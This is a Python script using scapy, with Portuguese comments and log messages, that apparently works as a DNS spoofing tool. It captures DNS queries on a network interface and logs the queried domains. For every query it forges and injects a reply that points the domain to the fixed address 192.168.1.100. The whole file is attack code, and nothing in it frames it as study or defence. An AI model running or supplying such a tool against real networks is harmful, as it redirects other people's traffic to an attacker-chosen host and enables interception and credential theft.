from scapy.all import sniff, sendp, DNS, DNSQR, DNSRR, IP, UDP
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

numero_consultas_dns = 0
dominios_dns = []

def contar_e_analisar_dns(pacote):
    global numero_consultas_dns
    if DNSQR in pacote:
        numero_consultas_dns += 1
        dominio = pacote[DNSQR].qname.decode()
        if dominio not in dominios_dns:
            dominios_dns.append(dominio)
        logging.info(f"xxx Consulta DNS Capturada: {dominio}")
        logging.debug(pacote.summary())
        logging.debug(pacote.show())

def modificar_resposta_dns(pacote):
    if DNS in pacote and pacote[DNS].qr == 0:
        logging.info("xxx Modificando Resposta DNS...")
        resposta = pacote.copy()
        resposta[IP].src = pacote[IP].dst
        resposta[IP].dst = pacote[IP].src
        resposta[UDP].sport = pacote[UDP].dport
        resposta[UDP].dport = pacote[UDP].sport
        resposta[DNS].qr = 1
        resposta[DNS].ancount = 1
        resposta[DNS].an = DNSRR(rrname=pacote[DNSQR].qname, rdata="192.168.1.100")
        del resposta[IP].len, resposta[IP].chksum
        del resposta[UDP].len, resposta[UDP].chksum
        logging.debug("xxx Pacote Modificado:")
        logging.debug(resposta.show())
        return resposta
    return None

def injetar_pacote(pacote):
    logging.info("xxx Injetando pacote modificado...")
    sendp(pacote, verbose=False)

def capturar_e_processar(interface, quantidade):
    logging.info(f"xxx Capturando {quantidade} pacotes na interface {interface}...")
    sniff(iface=interface, filter="udp and port 53", prn=processar_pacote, count=quantidade)

def processar_pacote(pacote):
    contar_e_analisar_dns(pacote)
    pacote_modificado = modificar_resposta_dns(pacote)
    if pacote_modificado:
        injetar_pacote(pacote_modificado)

def main():
    print("xxx Iniciando o programa Sniffer e Manipulador de DNS...")
    print("xxx Ctrl+C para Parar.")
    try:
        capturar_e_processar(interface="eth0", quantidade=100)
    except KeyboardInterrupt:
        print("\nxxx Execução interrompida. Resultados finais:")
        print(f"Total de consultas DNS capturadas: {numero_consultas_dns}")
        print("xxx Domínios Capturados:")
        for dominio in dominios_dns:
            print(dominio)
    logging.info("finalizado.")

if __name__ == "__main__":
    main()
